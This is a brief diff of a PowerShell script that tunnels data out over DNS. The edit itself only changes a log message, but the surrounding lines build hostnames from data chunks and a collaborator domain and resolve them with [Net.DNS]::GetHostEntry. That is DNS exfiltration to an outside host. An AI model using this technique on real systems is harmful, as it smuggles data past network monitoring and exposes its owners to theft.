@@ -43,5 +43,5 @@ foreach($word in $splitData) {
 
 #Tell the tunnel how much data it should expect
 $amountChunk = "$dnsFlag.$amountFlag.$counter.$collabDomain"
-Write-Verbose "Tunneling amount chunk $amountChunk"
+Write-Verbose "Tunneling amount chunk: $amountChunk"
 [Net.DNS]::GetHostEntry($amountChunk) | Out-Null
